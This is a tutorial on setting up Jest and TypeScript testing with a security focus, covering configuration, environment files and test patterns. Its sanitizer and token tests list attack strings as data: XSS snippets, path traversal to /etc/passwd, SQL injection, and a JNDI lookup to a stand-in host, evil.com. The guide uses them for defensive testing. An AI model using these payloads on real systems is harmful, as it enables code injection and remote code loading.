# Security-Conscious Jest Testing Guide for TypeScript Projects

A comprehensive guide for setting up robust, security-focused testing with Jest and TypeScript. This guide emphasizes security best practices, proper environment management, and real-world testing patterns.

## Table of Contents
1. [Quick Setup Checklist](#quick-setup-checklist)
2. [Project Structure](#project-structure)
3. [Dependencies and Configuration](#dependencies-and-configuration)
4. [Environment and Security Setup](#environment-and-security-setup)
5. [Test Organization Patterns](#test-organization-patterns)
6. [Security Testing Patterns](#security-testing-patterns)
7. [API Testing Best Practices](#api-testing-best-practices)
8. [Common Issues and Solutions](#common-issues-and-solutions)
9. [Performance and CI Considerations](#performance-and-ci-considerations)

## Quick Setup Checklist

- [ ] Install Jest, ts-jest, and TypeScript types
- [ ] Create `jest.config.cjs` (avoid `.js` for better compatibility)
- [ ] Set up `tsconfig.test.json` for test-specific TypeScript config
- [ ] Create test setup file with environment loading
- [ ] Configure `.env` and `.env.example` for secrets management
- [ ] Set up `.gitignore` to exclude `.env` files
- [ ] Create security-focused test patterns
- [ ] Configure appropriate timeouts for API tests
- [ ] Add conditional testing for API credentials

## Project Structure

```
project/
├── src/
│   ├── index.ts              # Main application
│   ├── security/             # Security utilities
│   ├── api/                  # API clients
│   └── utils/                # General utilities
├── tests/
│   ├── setup.ts              # Test environment setup
│   ├── unit/                 # Unit tests
│   ├── security/             # Security-specific tests
│   ├── integration/          # API integration tests
│   └── fixtures/             # Test data
├── .env                      # Environment variables (NEVER COMMIT)
├── .env.example              # Example environment file
├── .gitignore                # Must include .env
├── jest.config.cjs           # Jest configuration
├── tsconfig.json            # Main TypeScript config
├── tsconfig.test.json       # Test TypeScript config
└── package.json             # Dependencies and scripts
```

## Dependencies and Configuration

### Essential Dependencies

```json
{
  "devDependencies": {
    "@types/jest": "^29.5.14",
    "@types/node": "^20.0.0",
    "jest": "^29.7.0",
    "ts-jest": "^29.4.0",
    "typescript": "^5.0.0"
  },
  "dependencies": {
    "dotenv": "^16.0.0",
    "zod": "^3.20.0"
  }
}
```

### Recommended Scripts

```json
{
  "scripts": {
    "test": "jest",
    "test:unit": "jest tests/unit",
    "test:security": "jest tests/security",
    "test:integration": "jest tests/integration",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:ci": "jest --ci --coverage --watchAll=false",
    "check-env": "node scripts/check-env.js"
  }
}
```

### Jest Configuration (jest.config.cjs)

```javascript
module.exports = {
  preset: 'ts-jest',
  testEnvironment: 'node',
  roots: ['<rootDir>/tests', '<rootDir>/src'],
  testMatch: ['**/?(*.)+(spec|test).ts'],
  transform: {
    '^.+\\.ts$': ['ts-jest', {
      useESM: false,
      tsconfig: './tsconfig.test.json'
    }],
  },
  moduleFileExtensions: ['ts', 'tsx', 'js', 'jsx', 'json', 'node'],
  collectCoverageFrom: [
    'src/**/*.ts',
    '!src/**/*.d.ts',
    '!src/index.ts',
    '!src/**/*.config.ts'
  ],
  coverageDirectory: 'coverage',
  coverageReporters: ['text', 'lcov', 'html'],
  coverageThreshold: {
    global: {
      branches: 70,
      functions: 70,
      lines: 70,
      statements: 70
    }
  },
  testTimeout: 30000,  // Adjust based on your API calls
  forceExit: true,
  clearMocks: true,
  setupFilesAfterEnv: ['<rootDir>/tests/setup.ts'],
  detectOpenHandles: true,
  verbose: true,
  // Separate test patterns for different types
  projects: [
    {
      displayName: 'unit',
      testMatch: ['<rootDir>/tests/unit/**/*.test.ts']
    },
    {
      displayName: 'integration',
      testMatch: ['<rootDir>/tests/integration/**/*.test.ts'],
      testTimeout: 60000  // Longer timeout for API tests
    }
  ]
};
```

### TypeScript Test Configuration (tsconfig.test.json)

```json
{
  "extends": "./tsconfig.json",
  "compilerOptions": {
    "module": "commonjs",
    "target": "es2020",
    "moduleResolution": "node",
    "esModuleInterop": true,
    "allowSyntheticDefaultImports": true,
    "isolatedModules": true,
    "types": ["node", "jest"],
    "resolveJsonModule": true
  },
  "include": ["tests/**/*", "src/**/*"],
  "exclude": ["node_modules", "build", "dist"]
}
```

## Environment and Security Setup

### Test Setup File (tests/setup.ts)

```typescript
import { jest } from '@jest/globals';
import dotenv from 'dotenv';

// Load environment variables (prefer .env.test for testing)
dotenv.config({ path: '.env.test' });
dotenv.config(); // Fallback to .env

// Security: Ensure test environment
if (process.env.NODE_ENV !== 'test') {
  process.env.NODE_ENV = 'test';
}

// Mock external services by default
global.fetch = jest.fn() as jest.MockedFunction<typeof fetch>;

// Optional: Reduce console noise in tests
const originalConsole = global.console;
global.console = {
  ...originalConsole,
  log: jest.fn(),
  warn: jest.fn(),
  error: originalConsole.error, // Keep errors for debugging
};

// Security: Clear sensitive environment variables after tests
afterAll(() => {
  delete process.env.API_KEY;
  delete process.env.SECRET_TOKEN;
  delete process.env.DATABASE_URL;
});
```

### Environment Files

**.env.example**:
```bash
# Application Configuration
NODE_ENV=development
PORT=3000

# API Configuration
API_KEY=your_api_key_here
API_BASE_URL=https://api.example.com

# Security Configuration
RATE_LIMIT_REQUESTS=100
RATE_LIMIT_WINDOW_MS=60000
REQUEST_TIMEOUT_MS=30000

# Database (if applicable)
DATABASE_URL=your_database_url_here

# Development/Debug
LOG_LEVEL=info
DEBUG=false
```

**.env.test** (for testing):
```bash
NODE_ENV=test
API_KEY=test_api_key_here
DATABASE_URL=test_database_url
LOG_LEVEL=error
```

### Environment Check Script (scripts/check-env.js)

```javascript
#!/usr/bin/env node
import dotenv from 'dotenv';

dotenv.config();

const requiredVars = ['API_KEY', 'NODE_ENV'];
const sensitiveVars = ['API_KEY', 'DATABASE_URL', 'SECRET_TOKEN'];

console.log('Environment Configuration Check:');
console.log('================================');

requiredVars.forEach(varName => {
  const value = process.env[varName];
  if (sensitiveVars.includes(varName)) {
    console.log(`${varName}: ${value ? `set (${value.length} chars)` : 'NOT SET ❌'}`);
  } else {
    console.log(`${varName}: ${value || 'NOT SET ❌'}`);
  }
});

const missing = requiredVars.filter(v => !process.env[v]);
if (missing.length > 0) {
  console.log(`\n⚠️  Missing required variables: ${missing.join(', ')}`);
  process.exit(1);
} else {
  console.log('\n✅ All required environment variables are set!');
}
```

## Test Organization Patterns

### 1. Unit Tests (tests/unit/)

Test individual functions and utilities:

```typescript
// tests/unit/security.test.ts
import { sanitizeInput, validateEmail, hashPassword } from '../../src/security/utils';

describe('Security Utils', () => {
  describe('sanitizeInput', () => {
    test('should remove dangerous characters', () => {
      const maliciousInput = '<script>alert("xss")</script>';
      const result = sanitizeInput(maliciousInput);
      
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
    });

    test('should preserve safe content', () => {
      const safeInput = 'Hello, World! 123';
      const result = sanitizeInput(safeInput);
      
      expect(result).toBe(safeInput);
    });
  });
});
```

### 2. Security Tests (tests/security/)

Dedicated security testing:

```typescript
// tests/security/authentication.test.ts
import { validateToken, checkPermissions } from '../../src/auth';

const TEST_TOKEN = process.env.API_KEY;

describe('Authentication Security', () => {
  test('should reject malformed tokens', () => {
    const maliciousTokens = [
      '',
      'null',
      'undefined',
      '../../../etc/passwd',
      '<script>alert(1)</script>',
      'SELECT * FROM users;'
    ];

    maliciousTokens.forEach(token => {
      expect(validateToken(token)).toBe(false);
    });
  });

  test('should validate legitimate tokens', () => {
    if (!TEST_TOKEN) {
      console.log('Skipping token validation - no test token available');
      return;
    }

    expect(validateToken(TEST_TOKEN)).toBe(true);
  });
});
```

### 3. Integration Tests (tests/integration/)

Test API interactions and external services:

```typescript
// tests/integration/api.test.ts
import { ApiClient } from '../../src/api/client';

const API_KEY = process.env.API_KEY;
const client = new ApiClient();

describe('API Integration', () => {
  beforeEach(() => {
    if (!API_KEY) {
      console.log('Skipping API tests - no API key configured');
    }
  });

  test('should handle successful API calls', async () => {
    if (!API_KEY) return;

    const result = await client.fetchData({ limit: 5 });
    
    expect(result).toBeTruthy();
    expect(result.data).toBeDefined();
    expect(Array.isArray(result.data)).toBe(true);
  });

  test('should handle API errors gracefully', async () => {
    const result = await client.fetchData({ invalidParam: 'test' });
    
    expect(result).toBeNull();
  });
});
```

## Security Testing Patterns

### Input Validation and Sanitization

```typescript
describe('Input Security', () => {
  const dangerousInputs = [
    '<script>alert("xss")</script>',
    'javascript:void(0)',
    'data:text/html,<script>alert(1)</script>',
    '../../etc/passwd',
    'null; DROP TABLE users;--',
    '${jndi:ldap://evil.com/x}',
    '<img src=x onerror=alert(1)>',
    'onclick="alert(1)"'
  ];

  test.each(dangerousInputs)('should sanitize dangerous input: %s', (input) => {
    const sanitized = sanitizeInput(input);
    
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('javascript:');
    expect(sanitized).not.toContain('data:');
    expect(sanitized).not.toContain('onclick');
  });
});
```

### Rate Limiting Tests

```typescript
describe('Rate Limiting', () => {
  test('should enforce rate limits per client', () => {
    const rateLimiter = new RateLimiter(5, 1000); // 5 requests per second
    const clientId = 'test-client';

    // Should allow requests within limit
    for (let i = 0; i < 5; i++) {
      expect(rateLimiter.isAllowed(clientId)).toBe(true);
    }

    // Should deny additional requests
    expect(rateLimiter.isAllowed(clientId)).toBe(false);
  });

  test('should track different clients separately', () => {
    const rateLimiter = new RateLimiter(2, 1000);

    expect(rateLimiter.isAllowed('client1')).toBe(true);
    expect(rateLimiter.isAllowed('client2')).toBe(true);
    expect(rateLimiter.isAllowed('client1')).toBe(true);
    expect(rateLimiter.isAllowed('client2')).toBe(true);
  });
});
```

### Authentication and Authorization

```typescript
describe('Authentication Security', () => {
  test('should validate token format', () => {
    // Valid token patterns (adjust for your system)
    expect(validateToken('valid-token-format')).toBe(true);
    
    // Invalid formats
    expect(validateToken('')).toBe(false);
    expect(validateToken(null)).toBe(false);
    expect(validateToken(undefined)).toBe(false);
  });

  test('should check permissions properly', () => {
    const user = { id: 1, role: 'user' };
    const admin = { id: 2, role: 'admin' };

    expect(checkPermissions(user, 'read')).toBe(true);
    expect(checkPermissions(user, 'admin')).toBe(false);
    expect(checkPermissions(admin, 'admin')).toBe(true);
  });
});
```

## API Testing Best Practices

### Conditional Testing

```typescript
const API_KEY = process.env.API_KEY;
const shouldSkipApiTests = !API_KEY;

describe('External API Tests', () => {
  beforeAll(() => {
    if (shouldSkipApiTests) {
      console.log('⚠️  Skipping API tests - no API key configured');
      console.log('   Set API_KEY environment variable to run these tests');
    }
  });

  test('should fetch data successfully', async () => {
    if (shouldSkipApiTests) return;

    const data = await fetchFromApi('/endpoint');
    
    expect(data).toBeTruthy();
    expect(data.status).toBe('success');
  });
});
```

### Error Handling Tests

```typescript
describe('API Error Handling', () => {
  test('should handle network errors', async () => {
    // Mock network failure
    global.fetch = jest.fn().mockRejectedValue(new Error('Network error'));

    const result = await apiCall();
    
    expect(result).toBeNull();
    expect(console.error).toHaveBeenCalledWith(
      expect.stringContaining('Network error')
    );
  });

  test('should handle HTTP errors', async () => {
    // Mock HTTP error response
    global.fetch = jest.fn().mockResolvedValue({
      ok: false,
      status: 404,
      statusText: 'Not Found'
    });

    const result = await apiCall();
    
    expect(result).toBeNull();
  });
});
```

### Response Validation

```typescript
describe('API Response Validation', () => {
  test('should validate response structure', async () => {
    if (!API_KEY) return;

    const response = await fetchData();
    
    // Use schema validation (e.g., Zod)
    expect(() => ResponseSchema.parse(response)).not.toThrow();
    
    // Or manual validation
    expect(response).toHaveProperty('data');
    expect(response).toHaveProperty('status');
    expect(Array.isArray(response.data)).toBe(true);
  });
});
```

## Common Issues and Solutions

### 1. Multiple Configuration Files
**Problem**: "Multiple configurations found"
```bash
# Solution: Keep only one Jest config
rm jest.config.js  # Use jest.config.cjs
```

### 2. ES Modules vs CommonJS Issues
**Problem**: `import.meta` not supported in Jest
```typescript
// Instead of: if (import.meta.url === `file://${process.argv[1]}`)
// Use:
if (require.main === module && process.env.NODE_ENV !== 'test') {
  startServer();
}
```

### 3. Environment Variable Loading
**Problem**: Environment variables not available in tests
```typescript
// Solution: Ensure dotenv is loaded in setup
import dotenv from 'dotenv';
dotenv.config({ path: '.env.test' });
dotenv.config(); // Fallback
```

### 4. Async Test Timeouts
**Problem**: Tests timeout on API calls
```javascript
// Solution: Increase timeout in Jest config
module.exports = {
  testTimeout: 60000, // 60 seconds for API tests
  // Or per test:
  // test('api call', async () => { ... }, 60000);
};
```

### 5. Memory Leaks from Open Handles
**Problem**: Jest warnings about open handles
```javascript
// Solution: Configure Jest for better cleanup
module.exports = {
  forceExit: true,
  detectOpenHandles: true,
  // And ensure proper cleanup in tests
};
```

## Performance and CI Considerations

### Test Organization for CI

```json
{
  "scripts": {
    "test:unit": "jest tests/unit --maxWorkers=4",
    "test:security": "jest tests/security --runInBand",
    "test:integration": "jest tests/integration --runInBand --testTimeout=120000",
    "test:ci": "npm run test:unit && npm run test:security && npm run test:integration"
  }
}
```

### Parallel Testing Considerations

```javascript
// For CI environments
module.exports = {
  maxWorkers: process.env.CI ? 2 : '50%',
  // Some tests should run serially (rate limiting, etc.)
  runner: process.env.CI ? 'jest-serial-runner' : undefined
};
```

### Security in CI

```yaml
# .github/workflows/test.yml
env:
  NODE_ENV: test
  API_KEY: ${{ secrets.TEST_API_KEY }}  # Store in GitHub secrets
```

## Best Practices Checklist

- [ ] **Environment Security**: Use `.env` files, never commit secrets
- [ ] **Test Isolation**: Each test should be independent
- [ ] **Input Validation**: Test all user inputs for security issues
- [ ] **Error Handling**: Test failure scenarios, not just success
- [ ] **Rate Limiting**: Test and respect API rate limits
- [ ] **Conditional Testing**: Skip tests when external dependencies unavailable
- [ ] **Realistic Timeouts**: Set appropriate timeouts for different test types
- [ ] **Coverage Goals**: Aim for high coverage, especially security code
- [ ] **Documentation**: Document test patterns and security considerations
- [ ] **CI Integration**: Ensure tests run reliably in CI environments

Remember: Security testing takes time and patience. Real API tests with proper rate limiting are valuable investments in code quality!
